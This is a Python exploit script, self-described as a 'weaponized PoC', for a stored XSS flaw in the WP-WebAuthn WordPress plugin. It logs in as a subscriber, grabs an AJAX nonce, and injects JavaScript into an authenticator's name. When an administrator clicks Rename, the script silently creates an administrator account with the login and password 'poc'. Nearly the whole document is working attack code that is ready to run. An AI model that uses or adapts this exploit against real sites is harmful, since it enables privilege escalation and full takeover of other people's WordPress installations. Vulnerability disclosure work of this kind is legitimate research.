#!/usr/bin/env python3
"""Weaponized PoC: Stored XSS -> force admin browser to create poc:poc administrator."""
import re
import sys
import urllib.parse
import requests


def ask(prompt, default=""):
    v = input(f"{prompt} [{default}]: ").strip() if default else input(f"{prompt}: ").strip()
    return v or default


def build_payload(base_path):
    # No single quotes after breakout, no '<'. Uses only double quotes.
    # Trailing // comments out template remainder "')".
    p1 = f"{base_path}/wp-admin/user-new.php"
    return (
        "\\');fetch(\"" + p1 + "\").then(r=>r.text()).then(t=>{"
        "u=t.match(/_wpnonce_create-user\" value=\"([^\"]+)\"/)[1];"
        "f=new FormData();"
        "f.append(\"action\",\"createuser\");"
        "f.append(\"_wpnonce_create-user\",u);"
        "f.append(\"user_login\",\"poc\");"
        "f.append(\"email\",\"poc@example.com\");"
        "f.append(\"pass1\",\"poc\");"
        "f.append(\"pass2\",\"poc\");"
        "f.append(\"role\",\"administrator\");"
        "fetch(\"" + p1 + "\",{method:\"POST\",body:f,credentials:\"include\"})"
        "});//"
    )


def main():
    print("=== WP-WebAuthn Weaponized PoC (create poc:poc) ===")
    wp_url = ask("WordPress URL", "http://localhost:8851/wp").rstrip("/")
    username = ask("Username (Subscriber/Customer)")
    password = ask("Password")
    if not username or not password:
        print("Username/password are required.")
        sys.exit(1)

    base_path = urllib.parse.urlparse(wp_url).path.rstrip("/")
    payload = build_payload(base_path)
    print(f"[*] Payload len={len(payload)}")

    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})

    print("[*] Logging in to wp-login.php ...")
    login = s.post(f"{wp_url}/wp-login.php", data={
        "log": username, "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": f"{wp_url}/wp-admin/",
        "testcookie": "1",
    }, timeout=20, allow_redirects=True)
    if not any("wordpress_logged_in" in c.name for c in s.cookies):
        print("[-] Login failed. Check URL/username/password.")
        sys.exit(1)
    print("[+] Login OK.")

    print("[*] Fetching nonce from profile.php ...")
    p = s.get(f"{wp_url}/wp-admin/profile.php", timeout=20)
    m_nonce = re.search(r'"_ajax_nonce"\s*:\s*"([A-Za-z0-9]+)"', p.text)
    m_uid = re.search(r'var\s+php_vars\s*=\s*\{[^}]*?"user_id"\s*:\s*"?(\d+)"?', p.text, re.S)
    if not m_nonce:
        print("[-] Nonce not found.")
        sys.exit(1)
    nonce = m_nonce.group(1)
    uid = m_uid.group(1) if m_uid else "0"
    print(f"[+] nonce ok uid={uid}")

    params = {"action": "wwa_authenticator_list", "_ajax_nonce": nonce}
    if uid != "0":
        params["user_id"] = uid
    data = s.get(f"{wp_url}/wp-admin/admin-ajax.php", params=params, timeout=20).json()
    if not isinstance(data, list) or not data:
        print("[-] No authenticator yet. Register one first, then run again.")
        sys.exit(1)
    key = data[0].get("key")
    print(f"[+] Using key={key}")

    print("[*] Injecting weaponized payload ...")
    params2 = {
        "action": "wwa_modify_authenticator", "id": key,
        "name": payload, "target": "rename",
        "_ajax_nonce": nonce,
    }
    if uid != "0":
        params2["user_id"] = uid
    rn = s.get(f"{wp_url}/wp-admin/admin-ajax.php", params=params2, timeout=20)
    print(f"    Response: {rn.text[:200]!r}")
    print("[+] Done. As Admin open user-edit.php?user_id=" + uid +
          " and click Rename (dismiss prompt). Then check Users for poc:poc.")


if __name__ == "__main__":
    main()
